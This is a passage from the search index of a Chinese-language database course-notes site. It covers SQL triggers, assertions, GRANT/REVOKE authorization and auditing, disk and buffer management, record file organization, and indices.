<p>\u627e\u5230\u53ea\u62e5\u6709 account \u6216 loan \u7684 customers\u3002</p> <pre><code>SELECT customer_name\nFROM (depositor natural full outer join borrower)\nWHERE account_number is NULL OR loan_number is NULL;\n</code></pre>"},{"location":"Courses/DB/SQL/#assertions-triggers","title":"Assertions &amp; Triggers","text":"<p>assertion \u4e5f\u662f\u786e\u4fdd\u6570\u636e\u5e93 integrity \u7684\u65b9\u5f0f\u3002\u5f53\u6211\u4eec\u8bbe\u7f6e\u4e00\u4e2a assertion \u540e\uff0cDBMS \u4f1a\u5728\u6bcf\u4e00\u6b21\u66f4\u65b0\u540e\u68c0\u6d4b\uff1a</p> <pre><code>CREATE ASSERTION &lt;assertion_name&gt;\n    CHECK &lt;predicate&gt;\n</code></pre> <p>\u5982\u679c <code>CHECK</code> \u4e0d\u6ee1\u8db3\uff0c\u5219\u4f1a\u62d2\u7edd\u8fd9\u6b21\u66f4\u6539\u3002</p> <p>Triggers \u5219\u662f DBMS \u5728\u67d0\u4e9b\u7279\u5b9a\u7684 Modification \u540e\u81ea\u52a8\u6267\u884c\u7684\u4e00\u4e32\u8bed\u53e5\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u7b80\u5355\u7684 Trigger \u4f8b\u5b50\uff0c\u5176\u5728\u68c0\u6d4b\u5230 balance \u4e3a\u8d1f\u6570\u65f6\u89e6\u53d1\uff1a</p> <pre><code>CREATE TRIGGER overdraft_trigger AFTER update ON account\nreferencing new row AS nrow for each row\nWHEN nrow.balance &lt; 0\nBEGIN ATOMIC\n    INSERT INTO borrower\n    (SELECT customer_name, account_number FROM depositor\n    WHERE nrow.account_number = depositor.account_number)\n    INSERT INTO loan VALUES\n    (nrow.account_number, nrow.branch_name, -nrow.balacne)\n    UPDATE account SET balance = 0\n    WHERE account.account_number = nrow.account_number\nEND\n</code></pre> <p>\u76f8\u5f53\u4e8e\u81ea\u52a8\u5c06\u8fd9\u4e2a account \u8f6c\u6362\u4e3a loan \u8d37\u6b3e\u3002</p> <p>\u4e0a\u8ff0\u4f8b\u5b50\u4e2d\uff0c<code>AFTER update</code>, <code>new row</code>, <code>for each row</code> \u7b49\u90fd\u662f Trigger \u76f8\u5173\u7684\u5173\u952e\u5b57\uff0c\u9664\u6b64\u4e4b\u5916\u8fd8\u6709 <code>BEFORE delete</code>, <code>old row</code>, <code>for each statement</code> \u7b49\u3002</p>"},{"location":"Courses/DB/SQL/#authorization","title":"Authorization","text":"<ul> <li>&lt;1&gt; Read Authorization - allows reading, but not modification of data.</li> <li>&lt;2&gt; Insert Authorization - allows insertion of new data, but not modification of existing data.</li> <li>&lt;3&gt; Update Authorization - allows modification, but not deletion of data.</li> <li>&lt;4&gt; Delete Authorization - allows deletion of data.</li> </ul> <p>\u56db\u79cd\u6743\u9650\u6309\u987a\u5e8f\u7531\u6d45\u5165\u6df1\u3002</p> <p>\u5bf9\u4e8e\u6570\u636e\u5e93 Schema \u7684\u66f4\u6539\uff0c\u6709\u56db\u4e2a\u76f8\u5173\u6743\u9650</p> <ul> <li>Index Authorization - allows creation and deletion of indices.</li> <li>Resources Authorization - allows creation of new relations.<ul> <li>\u521b\u5efa <code>VIEW</code> \u5e76\u4e0d\u9700\u8981 Resources Authorization</li> </ul> </li> <li>Alteration Authorization - allows addition or modifying of attributes in a relation.</li> <li>Drop Authorization - allows deletion of relations.</li> </ul> <p><code>VIEW</code> \u662f\u63d0\u9ad8\u6570\u636e\u5e93\u5b89\u5168\u6027\u7684\u4e00\u79cd\u7b56\u7565\uff0c\u5b83\u53ef\u4ee5\u53ea\u63d0\u4f9b\u7ed9\u7528\u6237\u4ed6\u4eec\u9700\u8981\u7684\u6570\u636e\uff0c\u4f8b\u5982\u6211\u4eec\u60f3\u8981\u5bf9\u7528\u6237\u9690\u85cf <code>loan_number</code>\uff1a</p> <pre><code>CREATE VIEW cust_loan AS\nSELECT branch_name, customer_name\nFROM borrower, loan\nWHERE borrower.loan_number = loan.loan_number;\n</code></pre> <p><code>VIEW</code> \u7684\u5efa\u7acb\u8005\u5bf9\u8be5 <code>VIEW</code> \u7684\u6743\u9650\u4e5f\u4ec5\u9650\u4e8e\u4ed6\u672c\u8eab\u6709\u7684\u6743\u9650\u3002\u4f8b\u5982\uff0c\u4ed6\u5bf9 <code>borrower</code>, <code>loan</code> \u4e24\u4e2a\u8868\u90fd\u53ea\u6709 Read Authorization \uff0c\u90a3\u4e48\u4ed6\u5bf9 <code>cust_loan</code> \u4e5f\u53ea\u6709 Read Authorization\u3002</p> <p>Authorization \u68c0\u6d4b\u4e00\u5b9a\u8981\u5728 Query Processor \u5c06 VIEW \u66ff\u6362\u4e3a\u5b9e\u9645\u7684\u8868\u524d\u8fdb\u884c</p> <p>Authorization \u53ef\u4ee5\u901a\u8fc7 <code>GRANT</code> \u6307\u4ee4\u4f20\u9012\uff0c\u4e00\u4e2a\u5178\u578b\u7684 Authorization Graph \u5982\u4e0b\uff1a</p> <pre><code>graph TD;\n    DBA[DBA] --&gt;|grants| User1[User 1]\n    DBA --&gt;|grants| User2[User 2]\n    DBA --&gt;|grants| User3[User 3]\n\n    User1 --&gt;|grants| User4[User 4]\n    User1 --&gt;|grants| User5[User 5]\n\n    User2 --&gt;|grants| User5</code></pre> <p>Authorization Graph \u4e00\u5b9a\u6ee1\u8db3\u4efb\u4f55\u8282\u70b9\u90fd\u53ef\u4ee5\u8ffd\u6eaf\u5230 DBA\uff0c\u5426\u5219\u5c06\u8be5 Edge \u5220\u9664\u3002\u4f8b\u5982\uff0c\u5982\u679c DBA Revoke User 1\uff0c\u90a3\u4e48 User 4 \u6b64\u65f6\u4e5f\u5931\u53bb\u6743\u9650\uff1b\u800c User 5 \u5219\u8fd8\u6709 User 2 \u8d4b\u4e88\u7684\u6743\u9650\u3002</p> <p>\u7236\u8282\u70b9\u7684\u6743\u9650\u4e00\u5b9a\u5927\u4e8e\u7b49\u4e8e\u5b50\u8282\u70b9</p> <p>SQL \u4e2d <code>GRANT</code> \u548c <code>REVOKE</code> \u8bed\u53e5\u4e00\u822c\u683c\u5f0f\u5982\u4e0b\uff1a</p> <pre><code>GRANT &lt;privilige list&gt; ON &lt;table|view&gt;\nTO &lt;user list&gt; [WITH GRANT OPTION]\n-- WITH GRANT OPTION \u6307\u5141\u8bb8\u8be5 user \u4f20\u9012\u8be5 privilege\n\n\nREVOKE &lt;privilege list&gt; ON &lt;TABLE | VIEW&gt;\nFROM &lt;user list&gt; [RESTRICT | CASCADE]\n-- \u9ed8\u8ba4 CASCADE\uff0c\u5373\u9012\u5f52\u6d88\u9664\u6743\u9650\n-- \u5728 RESTRICT \u60c5\u51b5\u4e0b\uff0c\u5982\u679c\u6709 cascade revoke\uff0c\u5219\u8be5 REVOKE \u8bed\u53e5 fail\n</code></pre> <p>\u5176\u4e2d <code>&lt;privilige list&gt;</code> \u53ef\u9009\u7684\u9009\u9879\u4e3a\uff1a</p> <ul> <li>&lt;1&gt; insert</li> <li>&lt;2&gt; update</li> <li>&lt;3&gt; delete</li> <li>&lt;4&gt; references<ul> <li>\u521b\u5efa Relation \u65f6\u58f0\u660e Foreign Keys \u7684\u6743\u9650</li> </ul> </li> <li>&lt;5&gt; all priviliges/all<ul> <li>\u6240\u6709\u6743\u9650</li> </ul> </li> </ul> <p><code>&lt;user list&gt;</code> \u53ef\u9009\u7684\u9009\u9879\u4e3a\uff1a</p> <ul> <li>&lt;1&gt; user-ids</li> <li>&lt;2&gt; public<ul> <li>\u8868\u793a\u5141\u8bb8\u6240\u6709 Valid Users</li> </ul> </li> <li>&lt;3&gt; Role</li> </ul> <p>ROLE</p> <p>Role \u4e3a\u4e00\u7ec4 User \u63d0\u4f9b\u4ed6\u4eec\u5171\u6709\u7684 Privilege</p> <pre><code>CREATE ROLE MANAGER;\nGRANT UPDATE(branch_name) ON branch TO MANAGER;\nGRANT ALL ON account TO MANAGER;\nGRANT MANAGER TO &lt;user list&gt;;\n-- In SQL Server:\n-- ALTER ROLE MANAGER ADD MEMBER &lt;user list&gt;;\n</code></pre> <p>\u7531\u4e8e\u5728\u6570\u636e\u5e93\u5c42\u9762\uff08tuple level\uff09\u5b9e\u73b0 Authorization \u63a7\u5236\u5f00\u9500\u8fc7\u5927\uff0c\u56e0\u6b64\u6211\u4eec\u5728\u5e94\u7528\u5c42\u4e0a\u5b9e\u73b0\u3002</p> <p>Tuple Level \u6307\u53ea\u5141\u8bb8\u8bbf\u95ee\u67d0\u51e0\u884c</p> <p>Audit Trail \u662f\u8bb0\u5f55\u4e86\u6240\u6709\u66f4\u6539\u7684 Log\uff0c\u5176\u5305\u542b\u54ea\u4e2a\u7528\u6237\u5728\u54ea\u4e2a\u65f6\u95f4\u8fdb\u884c\u4e86\u4ec0\u4e48\u66f4\u6539\u7b49\u4fe1\u606f\u3002\u5177\u4f53\u53ef\u4ee5\u7528 <code>TRIGGER</code> \u5b9e\u73b0\uff0c\u4f46\u662f\u5f88\u591a DBMS \u4e5f\u76f4\u63a5\u652f\u6301\u8fd9\u4e00\u7279\u6027\uff1a</p> <pre><code>-- \u7528\u6237\u5ba1\u8ba1\nAUDIT &lt;st-opt&gt; [BY &lt;users&gt;] [BY SESSION | ACCESS]\n[WHENEVER SUCESSFULL | WHENEVER NOT SUCESSFULL];\n-- BY &lt;users&gt; \u7f3a\u7701\uff0c\u5219\u9ed8\u8ba4\u5bf9\u6240\u6709\u7528\u6237\u5ba1\u8ba1\n-- BY SESSION(\u9ed8\u8ba4\u503c) \u8868\u793a\u6bcf\u6b21\u4f1a\u8bdd\u671f\u95f4\uff0c\u76f8\u540c\u7c7b\u578b\u7684 SQL \u8bed\u53e5\u53ea\u8bb0\u5f55\u4e00\u6b21\n-- &lt;st-opt&gt;: TABLE, VIEW, ROLE, INDEX...\n-- \u9ed8\u8ba4\u90fd\u662f WHENEVER SUCESSFULL\n\n-- \u5b9e\u4f53\u5ba1\u8ba1\nAUDIT &lt;obj-opt&gt; ON &lt;obj&gt;|DEFAULT [BY SESSION | BY ACCESS]\n[WHENEVER SUCCESSFUL | WHENEVER NOT SUCCESSFUL]\n-- \u5b9e\u4f53\u5ba1\u8ba1\u5bf9\u6240\u6709\u7528\u6237\u8d77\u4f5c\u7528\n-- ON &lt;obj&gt; \u6307\u51fa\u5ba1\u8ba1\u5bf9\u8c61\u8868\u3001\u89c6\u56fe\u540d\uff1bON DEFAULT \u8868\u793a\u5bf9\u5176\u4e4b\u540e\u521b\u5efa\u7684\u6240\u6709\u5bf9\u8c61\u8d77\u4f5c\u7528\n</code></pre> <p>\u53d6\u6d88\u5ba1\u8ba1\u7528 <code>NOAUDIT</code> \u8bed\u53e5</p> <p>\u5ba1\u8ba1\u7ed3\u679c\u4e00\u822c\u8bb0\u5f55\u5728\u6570\u636e\u5b57\u5178\u8868 <code>sys.aud$</code> \u4e2d\uff0c\u4e5f\u53ef\u4ee5\u4ece <code>dba_audit_trail</code>\u3001<code>dba_audit_statement</code>\u3001<code>dba_audit_object</code> \u7b49\u8868\u4e2d\u83b7\u5f97\u6709\u5173\u60c5\u51b5\u3002\u4e0a\u8ff0\u8868\u4ec5\u6709 DBA \u53ef\u89c1\u3002</p>"},{"location":"Courses/DB/Storage%20%26%20File/","title":"Storage & File","text":""},{"location":"Courses/DB/Storage%20%26%20File/#storage-file","title":"Storage &amp; File","text":"<p> \u7ea6 3976 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 20 \u5206\u949f</p>"},{"location":"Courses/DB/Storage%20%26%20File/#disk","title":"Disk","text":"<p>\u4e00\u4e2a Storage Media \u53ef\u4ee5\u6309\u7167 Speed, Cost, Reliability \u4e09\u70b9\u8fdb\u884c\u8bc4\u4ef7\u5206\u7c7b\u3002</p> <p></p> <ul> <li>&lt;1&gt; Primary Storage: Fastest but Volatile<ul> <li>\u5305\u62ec cache\u3001main memory</li> </ul> </li> <li>&lt;2&gt; Secondary Storage: Moderately fast and Non-volatile<ul> <li>\u5305\u62ec flash\u3001magnetic disk</li> </ul> </li> <li>&lt;3&gt; Tertiary Storage: Slowest and Non-volatile<ul> <li>\u5305\u62ec optical disk\u3001magnetic tape</li> </ul> </li> </ul> <p>\u4e0e\u6211\u4eec DBMS \u7684\u8bbe\u8ba1\u76f8\u5173\u7684\u4e3b\u8981\u4e3a Disk \u4ee5\u53ca Main Memory\u3002</p> <p>\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u7b80\u5316\u7684 Disk \u673a\u68b0\u7ed3\u6784\uff1a</p> <p></p> <p>Sector \u662f\u78c1\u76d8\u7684\u6700\u5c0f\u5355\u4f4d\uff0c\u901a\u5e38\u5927\u5c0f\u4e3a 512 Bytes\u3002\u4e00\u4e2a\u8bfb\u5199\u8bf7\u6c42\u7684\u53d1\u9001\u5230\u5b9e\u9645\u6570\u636e\u5f00\u59cb\u4f20\u8f93\uff0c\u6240\u9700\u8981\u7684 Access Time\uff0c\u53ef\u5206\u4e3a\u4e24\u4e2a\u90e8\u5206\uff1a</p> <ul> <li>&lt;1&gt; Seek Time: \u8bfb\u5199\u5934\u8fd0\u52a8\u5230\u6247\u533a\u5bf9\u5e94\u7684 Track \u6240\u9700\u7684\u65f6\u95f4</li> <li>&lt;2&gt; Rotatianal Latency Time: Platter \u5c06\u6247\u533a\u65cb\u8f6c\u5230\u8bfb\u5199\u5934\u4e0b\u6240\u9700\u7684\u65f6\u95f4<ul> <li>Average Latency \u5373\u4e3a 1/2 \u5708</li> </ul> </li> </ul> <p>\u5bfb\u9053\u65f6\u95f4\u548c\u65cb\u8f6c\u7b49\u5f85\u65f6\u95f4\u53d7\u673a\u68b0\u8fd0\u52a8\u5f71\u54cd\uff0c\u662f\u96be\u4ee5\u4f18\u5316\u7684\u3002\u5b9e\u9645\u4e0a\uff0c\u786c\u76d8\u5b58\u53d6\u65f6\u95f4\u7684\u901f\u7387\u4e3b\u8981\u5c40\u9650\u5c31\u5728 Access Time\u3002</p> <p>Disk-arm-scheduling algorithms \u5176\u5b9e\u5c31\u662f\u7535\u68af\u8c03\u5ea6\u7b97\u6cd5</p> <p>Block \u662f\u78c1\u76d8\u548c\u4e3b\u5b58\u6570\u636e\u4ea4\u4e92\u7684\u6700\u5c0f\u5355\u4f4d\uff0c\u5b83\u662f\u4f4d\u4e8e\u540c\u4e00\u4e2a track \u7684\u8fde\u7eed\u6247\u533a\u5e8f\u5217\uff0c\u5927\u5c0f\u901a\u5e38\u4e3a 512 Bytes - 16 KB\u3002Block \u5c0f\uff0c\u5219\u9700\u8981\u66f4\u591a\u6b21 Transfers\uff1bBlock \u5927\uff0c\u5219\u53d6\u51fa\u4e00\u4e2a\u5c0f\u6570\u636e\u4f1a\u6d6a\u8d39\u5f88\u591a\u7a7a\u95f4\u3002</p>"},{"location":"Courses/DB/Storage%20%26%20File/#storage-access","title":"Storage Access","text":"<p>\u6570\u636e\u5e93\u7cfb\u7edf\u4e2d\uff0cFile \u6309\u7167\u5b9a\u957f\u5b58\u50a8\u5355\u5143 Block \u903b\u8f91\u5212\u5206\u3002Blocks \u662f\u5b9e\u73b0 Storage Allocation \u548c Data Transfer \u7684\u57fa\u672c\u5355\u5143\u3002</p> <p>\u56e0\u4e3a\u7cfb\u7edf\u4e0d\u80fd\u76f4\u63a5\u5728\u78c1\u76d8\u64cd\u4f5c\u6570\u636e\uff0cDBMS \u8981\u8d1f\u8d23\u5982\u4f55\u5728\u975e\u6613\u5931\u6027\u78c1\u76d8\u548c\u6613\u5931\u6027\u5185\u5b58\u4e2d\u79fb\u52a8\u6570\u636e\u3002\u5b83\u901a\u8fc7 Buffer \u6765\u7ba1\u7406\u78c1\u76d8\u548c\u5185\u5b58\u4e4b\u95f4\u7684\u6570\u636e\u79fb\u52a8\u3002</p> <p></p> <p>\u8fd9\u91cc\u533a\u5206\u51e0\u4e2a\u6982\u5ff5\uff1a</p> <ul> <li>Page: A unit of data</li> <li>Block: A unit of disk space</li> <li>Frame A unit of buffer pool</li> </ul> <p>\u4e00\u822c\u6765\u8bb2\uff0c\u90fd\u53ef\u4ee5\u5c06 Page \u548c Block \u7b49\u4ef7\u770b\u5f85\u3002</p> <p>\u4e0a\u5c42\u7684 Execution Engine \u6839\u636e\u8bf7\u6c42\u5411\u7f13\u51b2\u6c60\u8bf7\u6c42\u7279\u5b9a Page\uff0c\u7f13\u51b2\u6c60\u8d1f\u8d23\u5c06\u8be5 Page \u653e\u5165\u5185\u5b58\uff0c\u5e76\u63d0\u4f9b\u6307\u5411\u5185\u5b58\u4e2d\u8be5 Page \u7684\u4e00\u4e2a\u6307\u9488</p> <p>\u5f53\u4e0a\u5c42\u5e94\u7528\u5411 Buffer Manager \u8bf7\u6c42 Page \u65f6\uff0c\u6309\u7167\u5bf9\u5e94 Page \u662f\u5426\u5728 Buffer Pool \u5185\u6709\u4e0d\u540c\u7684\u5904\u7406\uff1a</p> <ul> <li>\u5982\u679c Page \u5df2\u5728 Buffer \u4e2d\uff1a \u8fd4\u56de\u8be5 Page \u5728\u5185\u5b58\u4e2d\u7684\u5730\u5740</li> <li>\u5982\u679c Page \u4e0d\u5728 Buffer \u4e2d\uff1a<ul> <li>&lt;1&gt; \u5728 Buffer \u4e2d\u4e3a\u65b0 Page \u5f00\u8f9f\u7a7a\u95f4\uff0c\u6839\u636e\u4e0d\u540c\u7b56\u7565\u66ff\u6362\u6389\u4e00\u4e9b\u8001 Page<ul> <li>\u5982\u679c\u6ca1\u6709\u7a7a\u4f4d\uff0c\u5219\u589e\u5927 Buffer</li> </ul> </li> <li>&lt;2&gt; \u88ab\u66ff\u6362\u7684 Page \u5982\u679c\u662f Dirty \u7684\uff0c\u5219\u5199\u56de</li> <li>&lt;3&gt; \u4ece\u78c1\u76d8\u4e2d\u8bfb\u53d6 Page\uff0c\u5e76\u8fd4\u56de\u8be5 Page \u5728\u5185\u5b58\u4e2d\u5730\u5740</li> </ul> </li> </ul> <p>\u5f53\u67d0\u4e2a Page(Block) \u6b63\u5728\u88ab\u4f7f\u7528\u65f6\uff0c\u6211\u4eec\u6807\u8bb0\u4e3a Pinned Block\uff0c\u6b64\u65f6\u5b83\u4e0d\u80fd\u88ab\u66ff\u6362\u3002\u8003\u8651\u5230\u6570\u636e\u5e93\u7684\u5e76\u53d1\u6027\uff0c\u6211\u4eec\u4e3a Pool \u4e2d\u7684 Page \u7ef4\u62a4\u4e00\u4e2a Pin Count\uff0c\u5f53\u4e14\u4ec5\u5f53 pin count = 0 \u65f6\uff0c\u8be5 Page \u624d\u80fd\u6210\u4e3a\u66ff\u6362\u7b56\u7565\u7684\u5019\u9009\u4eba\u4e4b\u4e00\u3002</p> <ul> <li>LRU \u6700\u8fd1\u6700\u5c11\u4f7f\u7528\u7b56\u7565<ul> <li>LRU \u5728 Cache \u7b49\u786c\u4ef6\u4e2d\u5c61\u8bd5\u4e0d\u723d\uff0c\u4f46\u662f\u5728\u6570\u636e\u5e93\u573a\u666f\u53ef\u80fd\u5b58\u5728\u7684\u91cd\u590d\u626b\u63cf\u4e2d\u5e76\u4e0d\u5408\u9002</li> <li>e.g. \\(borrow \\bowtie customer\\)\uff0c\u7c7b\u4f3c\u4e8e\u4e8c\u91cd\u5faa\u73af\u7684\u573a\u666f\uff0c\u6bcf\u8bfb\u53d6 \\(borrow\\) \u4e00\u4e2a tuple\uff0c\u5c31\u5bf9 \\(customer\\) \u7684 tuple \u8fdb\u884c\u4e00\u8f6e\u626b\u63cf</li> </ul> </li> <li>MRU \u6700\u8fd1\u6700\u5e38\u4f7f\u7528\u7b56\u7565<ul> <li>\u66f4\u5b9e\u8df5\u6027\u7684\u505a\u6cd5\u662f\uff0c\u6839\u636e Query Optimizer \u6765\u9009\u62e9 Mixed Strategy</li> </ul> </li> <li>Toss-immediate Strategy \u7528\u5b8c\u7acb\u5373\u4e22\u5f03<ul> <li>\u4e25\u683c\u6765\u8bb2\u5e76\u4e0d\u5c5e\u4e8e\u66ff\u6362\u7b56\u7565\uff0c\u4f46\u5b83\u4eec\u90fd\u662f\u7528\u4e8e\u89e3\u51b3\u7a7a\u95f4\u4e0d\u591f\u7528\u7684\u95ee\u9898</li> </ul> </li> </ul>"},{"location":"Courses/DB/Storage%20%26%20File/#file-organization","title":"File Organization","text":"\u4ee5\u524d\u8003\u8bd5\u66fe\u8003\u8fc7 Column-Oriented Relation \u7684\u4f18\u7f3a\u70b9 <p>\u4e3b\u6d41\u7684\u4e8b\u52a1\u578b\u6570\u636e\u5e93(OLTP)\u5927\u591a\u91c7\u7528\u884c\u5f0f\u5b58\u50a8\uff0c\u4e0d\u8fc7\u8fd1\u51e0\u5e74\u5206\u6790\u578b\u6570\u636e\u5e93(OLAP)\u7684\u5174\u8d77\uff0c\u5217\u5f0f\u5b58\u50a8(Column-Oriented Storage) \u91cd\u65b0\u53d8\u5f97\u6d41\u884c\u3002\u5217\u5f0f\u5b58\u50a8\u5c06\u540c\u4e00\u5217\u7684\u6570\u636e\u5728\u78c1\u76d8\u4e2d\u8fde\u7eed\u5b58\u50a8\uff1a</p> <p></p> <p>\u663e\u7136\u5217\u5f0f\u5b58\u50a8\u5bf9 OLTP \u4e0d\u53cb\u597d\uff0c\u4e00\u884c\u6570\u636e\u7684\u5199\u5165\u9700\u8981\u540c\u65f6\u4fee\u6539\u591a\u4e2a\u5217\u3002\u4f46\u662f\u5bf9 OLAP \u573a\u666f\uff1a</p> <ul> <li>\u5f53\u67e5\u8be2\u8bed\u53e5\u53ea\u6d89\u53ca\u90e8\u5206\u5217\u65f6\uff0c\u53ea\u9700\u8981\u626b\u63cf\u76f8\u5173\u5217</li> <li>\u6bcf\u4e00\u5217\u6570\u636e\u7684\u7c7b\u578b\u76f8\u540c\uff0c\u5f7c\u6b64\u76f8\u5173\u6027\u66f4\u5927\uff0c\u5bf9\u5217\u6570\u636e\u7684\u538b\u7f29\u6548\u7387\u66f4\u9ad8</li> <li>\u5bf9\u73b0\u4ee3 Vector Processing CPU \u66f4\u53cb\u597d\u3001\u5bf9 Cache \u66f4\u53cb\u597d</li> </ul> <p>\u6570\u636e\u5e93 File \u7531\u4e00\u7cfb\u5217 records \u7ec4\u6210\uff0c\u5176\u53ef\u5206\u4e3a\u5b9a\u957f records \u548c\u53d8\u957f records\u3002</p> <p>\u76f8\u6bd4\u4e8e\u903b\u8f91\u5173\u7cfb\u6a21\u578b\u4e2d\u7684 Tuple\uff0cRecord \u8fd8\u5305\u542b\u4e8b\u52a1\u3001\u7248\u672c\u3001\u7a7a\u95f4\u7ba1\u7406\u7b49\u5143\u4fe1\u606f</p>"},{"location":"Courses/DB/Storage%20%26%20File/#fixed-length-records","title":"Fixed-Length Records","text":"<p>\u7531\u4e8e Records \u5b9a\u957f\uff0c\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u5730\u5b58\u50a8\u4e3a\u8fde\u7eed\u3001\u65e0\u7a7a\u9699\u3001\u5bf9\u9f50\u7684\u683c\u5f0f\uff1a</p> <p></p> <p>\u5f53\u67d0\u4e2a Records \\(i\\) \u88ab\u5220\u9664\u65f6\uff0c\u6709\u4ee5\u4e0b\u4e09\u79cd\u7b56\u7565\uff1a</p> <ul> <li>&lt;1&gt; Move \\(i+1, ...,n\\) to \\(i,...,n\\)</li> <li>&lt;2&gt; Move \\(n\\) to \\(i\\)</li> <li>&lt;3&gt; \u4e0d\u79fb\u52a8 Records\uff0c\u4f7f\u7528 Free List \u6765\u7ef4\u62a4\u7a7a\u4f4d</li> </ul> <p>\u5bf9\u4e8e Free List\uff0c\u6211\u4eec\u5728 Header \u4e2d\u7ef4\u62a4\u4e00\u4e2a\u6307\u5411\u7b2c\u4e00\u4e2a\u88ab\u5220\u9664\u7684 Record \u7684\u6307\u9488\uff0c\u6bcf\u4e00\u4e2a\u88ab\u5220\u9664\u7684\u7a7a Record \u4e0a\u90fd\u5b58\u50a8\u4e86\u6307\u5411\u4e0b\u4e00\u4e2a\u7a7a\u4f4d\u7684\u6307\u9488\u3002\u5f53\u6211\u4eec\u9700\u8981\u63d2\u5165\u65b0 Record \u65f6\uff0c\u76f4\u63a5\u901a\u8fc7\u6307\u9488\u627e\u5230\u7a7a\u4f4d\u63d2\u5165\uff0c\u7136\u540e\u66f4\u65b0\u6307\u9488\u5373\u53ef\u3002</p> <p></p> <p>\u4e0d\u9700\u8981\u989d\u5916 Column \u6765\u5b58\u50a8\u6307\u9488\uff0c\u53ef\u4ee5\u76f4\u63a5\u5728\u7a7a\u4f4d\u4e0a\u5b58\u50a8\u6307\u9488\uff0c\u63d0\u9ad8\u4e86\u7a7a\u95f4\u6548\u7387</p>"},{"location":"Courses/DB/Storage%20%26%20File/#variable-length-records","title":"Variable-Length Records","text":"<p>\u4e00\u4e2a Record \u662f\u53d8\u957f\u7684\uff0c\u53ef\u80fd\u6709\u4ee5\u4e0b\u539f\u56e0\uff1a</p> <ul> <li>&lt;1&gt; Storage of multiple record type in a file</li> <li>&lt;2&gt; Record Type \u5141\u8bb8\u53d8\u957f\uff0c\u4f8b\u5982 <code>varchar</code></li> <li>&lt;3&gt; Record Type \u5141\u8bb8 fields \u91cd\u590d<ul> <li>\u5728\u4e00\u4e9b Older Data Models \u4e2d\u53ef\u80fd\u51fa\u73b0</li> </ul> </li> </ul> <p></p> <p>\u524d\u9762\u7684\u53d8\u957f Attribute \u7528 <code>(offset, length)</code> \u7684\u5b9a\u957f\u683c\u5f0f\u5b58\u50a8\uff0c\u540e\u9762\u8ddf\u7740\u5b9a\u957f\u7684 Attribute\uff0c\u6700\u540e\u5b58\u50a8\u5b9e\u9645\u7684\u6570\u636e\u3002\u4e8c\u8005\u4e2d\u95f4\u8fd8\u5b58\u5728\u4e00\u4e2a <code>Null bitmap</code>\uff0c\u8868\u793a\u5bf9\u5e94\u7684 Attribute \u662f\u5426\u975e\u7a7a\u3002\u5728\u6b64\u4f8b\u4e2d\uff0c<code>0000</code> \u8868\u793a\u56db\u4e2a\u5c5e\u6027\u5747\u662f\u975e\u7a7a\u7684\u3002</p> <p>\u8fd9\u4e2a <code>65000</code> \u662f\u5b9a\u957f\u7684\u6570\u636e\uff0c64 bits \u7684\u6574\u578b\u6570\u636e <code>salary</code></p> <p>\u5bf9\u4e8e\u4e0a\u8ff0\u53d8\u957f\u7684 Records\uff0c\u6211\u4eec\u53ef\u4ee5\u6309\u7167 Slotted Page Structure \u5b58\u50a8\uff1a</p> <p></p> <p>\u5b9a\u957f\u7684 Slot \u4ece\u5f00\u5934\u589e\u957f\u5230\u672b\u5c3e\uff0c\u53d8\u957f\u7684 Records \u4ece\u672b\u5c3e\u589e\u957f\u5230\u5f00\u5934\uff0c\u5f53\u4e2d\u95f4\u7684 Free Space \u4e3a 0 \u65f6\uff0c\u89c6\u4e3a\u8be5 Page \u5df2\u6ee1\u3002</p> <p>Header \u4e2d\u5b58\u50a8\u4e86\uff1a</p> <ul> <li>&lt;1&gt; Record Entries \u7684\u6570\u91cf</li> <li>&lt;2&gt; Free Space \u7ed3\u675f\u7684\u4f4d\u7f6e<ul> <li>\u7528\u6765\u5206\u914d\u5185\u5b58</li> </ul> </li> <li>&lt;3&gt; \u5404\u4e2a Record \u7684\u4f4d\u7f6e\u4ee5\u53ca\u957f\u5ea6</li> </ul> <p>\u5bf9\u4e8e\u53d8\u957f Records\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5c06\u5176\u4ee5\u5b9a\u957f\u7684\u65b9\u5f0f\u6765\u5b58\u50a8\uff08\u4f46\u662f\u4e00\u822c\u4f7f\u7528\u7684\u8fd8\u662f slotted-structure \u7684\u5f62\u5f0f\uff09\uff0c\u6b64\u5904\u53ea\u7b80\u5355\u7ed9\u51fa\u51e0\u4e2a\u6837\u4f8b\uff1a</p> Reserved SpacePointer Method 1Pointer Method 2 <p></p> <p></p> <p></p> <p>Organization of Records in Files</p> <ul> <li>Heap File: \u4efb\u4f55\u6709\u7a7a\u4f4d\u7684\u5730\u65b9\u90fd\u53ef\u4ee5\u653e</li> <li>Sequential File: \u6839\u636e record \u7684 search key \u987a\u5e8f\u5b58\u653e</li> <li>Hashing File: \u6839\u636e record \u7684\u67d0\u4e9b attribute \u7684\u54c8\u5e0c\u503c\u6307\u5b9a\u4f4d\u7f6e\u5b58\u653e</li> <li>Clustering File Organization: \u5141\u8bb8\u6765\u81ea\u591a\u4e2a\u4e0d\u540c\u7684 Relation \u7684 records \u5b58\u653e\u5728\u540c\u4e00\u4e2a File \u4e2d</li> </ul>"},{"location":"Courses/DB/Storage%20%26%20File/#index","title":"Index","text":"<p>\u7d22\u5f15\u7528\u6765\u52a0\u901f\u6570\u636e\u83b7\u53d6\u7684\u65f6\u95f4\u3002\u5b9a\u4e49 Records \u4e2d\u7528\u4e8e\u7d22\u5f15\u7684\u4e00\u7ec4 Attributes \u4e3a Search Key\u3002</p> <p>\u4e00\u4e2a Index File \u7531 Index Entries \u7ec4\u6210\uff0c\u5b83\u4eec\u6709\u5982\u4e0b\u5f62\u5f0f\uff1a</p> <pre><code>+------------+---------+\n| Search-key | pointer |\n+------------+---------+\n</code></pre> <p>Index File \u8fdc\u5c0f\u4e8e Original File</p> <p>Index File \u4e2d\u7d22\u5f15\u8bb0\u5f55\u5982\u4f55\u7ec4\u7ec7\uff0c\u53d6\u51b3\u4e8e\u7d22\u5f15\u7684\u7c7b\u578b\uff1a</p> <ul> <li>&lt;1&gt; Ordered Indices: Search Key \u6309\u7167\u67d0\u79cd\u6392\u5e8f\u987a\u5e8f\u6392\u5217</li> <li>&lt;2&gt; Hash Indices: Seach Key \u5728\u54c8\u5e0c\u51fd\u6570\u4e0b\u5747\u5300\u7684\u5206\u5e03</li> </ul> 